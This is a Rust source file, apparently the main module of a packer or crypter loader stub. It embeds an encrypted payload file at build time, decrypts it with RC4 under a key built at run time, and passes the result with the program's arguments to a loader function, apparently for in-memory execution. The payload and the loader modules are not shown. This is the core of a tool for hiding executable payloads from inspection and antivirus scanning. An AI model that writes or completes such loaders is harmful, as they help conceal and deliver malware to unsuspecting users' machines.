mod handler;
mod helper;
mod walker;

use crate::handler::load;
use crate::helper::State;
use anyhow::Result;
use std::env;

const ENCRYPTED_DATA: &[u8] = include_bytes!("../data.bin");

fn dbytes() -> Vec<u8> {
    let mut buf = ENCRYPTED_DATA.to_vec();
    let s: Vec<u8> = helper::build_string();
    let mut rc4 = State::new(&s);
    rc4.apply_keystream(&mut buf);
    buf
}

fn prepare_args() -> Vec<String> {
    let args: Vec<String> = env::args().collect();
    let mut target_args = Vec::new();
    let current_exe_name = env::current_exe()
        .ok()
        .and_then(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
        .unwrap_or_else(|| "hello world".to_string());
    target_args.push(current_exe_name);
    if args.len() > 1 {
        for arg in args.iter().skip(1) {
            target_args.push(arg.clone());
        }
    }
    target_args
}

fn main() -> Result<()> {
    let target_args = prepare_args();
    let data = dbytes();
    load(data, target_args)?;
    Ok(())
}
